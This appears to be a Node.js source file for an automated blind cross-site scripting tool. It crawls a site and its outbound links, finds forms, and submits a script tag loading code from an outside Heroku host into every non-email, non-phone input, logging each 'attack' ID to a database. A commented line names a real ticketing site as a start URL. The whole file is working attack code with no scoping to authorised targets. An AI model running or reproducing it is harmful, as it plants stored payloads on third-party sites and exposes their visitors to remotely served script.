var request = require('request');
const cheerio = require('cheerio');
request = request.defaults({ jar: true });
var pRequest = require("promisified-request").create(request);
var fScraper = require("form-scraper");
const shortid = require('shortid');

//Model
const db = require('./models/db');
console.log(db);

//helpers
const emailGenerator = require('./helpers/email_generator');
const phoneGenerator = require('./helpers/phone_number_generator');
const emailIds = require('./helpers/email_address_ids');
const phoneIds = require('./helpers/phone_number_ids');

//const startUrl = 'https://tiket.kereta-api.co.id';
//const startUrl = 'https://catkinson19.github.io/test_site/';
//const depth = 1;

function crawlScrape(startUrl, urlSet) {

    let scrapedInternalUrls = [];
    let scrapedExternalUrls = [];
    let bothUrls = [];

    request(startUrl, function (err, resp, body) {
        $ = cheerio.load(body);
        links = $('a'); //jquery get all hyperlinks
        $(links).each(function (i, link) {

            let scrapedLink = $(link)
            scrapedLink = scrapedLink.attr('href');

            const urlREG = new RegExp("http");
            if (urlREG.test(scrapedLink)) {
                scrapedExternalUrls.push(scrapedLink);
                bothUrls.push(scrapedLink);
            } else {
                scrapedInternalUrls.push(`${startUrl}/${scrapedLink}`);
                bothUrls.push(`${startUrl}/${scrapedLink}`);
            }

        })
        let urlsToScrape;
        switch (urlSet) {
            case 'internal':
                urlsToScrape = scrapedInternalUrls;
                break;
            case 'external':
                urlsToScrape = scrapedExternalUrls;
                break;
            case 'both':
                urlsToScrape = bothUrls;
                break;
            default:
                throw new Error('Invalid url set');
        }
        console.log(urlsToScrape);

        for (let i = 0; i < urlsToScrape.length; i++) {
            request(urlsToScrape[i], function (err, resp, body) {
                $ = cheerio.load(body);
                let forms = $('form')[0];
                if (forms) {
                    //Pull all the forms off the page
                    let formId = [];
                    $('form').each(function (i, elem) {
                        formId[i] = $(this).attr('id');
                    });
                    formId.join(', ');
                    console.log(`I found ${formId.length} form(s) on ${urlsToScrape[i]}`);
                    for (let j = 0; j < formId.length; j++) {

                        //Current form Id
                        let currentFormId = (formId[j]);

                        //Store Input id's
                        let inputId = [];

                        //Create form object
                        let formObject = {};

                        $(`#${formId[j]} input`).each(function (i, elem) {
                            inputId[i] = $(this).attr('id');
                        });
                        inputId.join(', ');
                        console.log(`I found ${inputId.length} inputs(s) on ${currentFormId}`);

                        for (let x = 0; x < inputId.length; x++) {
                            if (emailIds.emailAddressIds.includes(inputId[x])) {
                                formObject[inputId[x]] = emailGenerator.emailAddress();
                            } else if (phoneIds.phoneNumberIds.includes(inputId[x])) {
                                formObject[inputId[x]] = phoneGenerator.phoneNumber();
                            } else {
                                let attackId = shortid.generate();

                                //Record Attack
                                db.createAttackDB(attackId, formId[j], inputId[x], scrapedInternalUrls[i]);
                                formObject[inputId[x]] = `<script src=https://rocky-savannah-17002.herokuapp.com/a/${attackId}></script>`;

                                //Submit Form
                                var formStructure = fScraper.fetchForm(`#${formId[j]}`, scrapedInternalUrls[i], pRequest);

                                fScraper.submitForm(formObject, fScraper.provideForm(formStructure), pRequest).then(function (response) {
                                    console.log(response.body);
                                });
                            }
                        }
                    }
                }
            })
        };
    });
};

module.exports = {
    crawlScrape: crawlScrape
}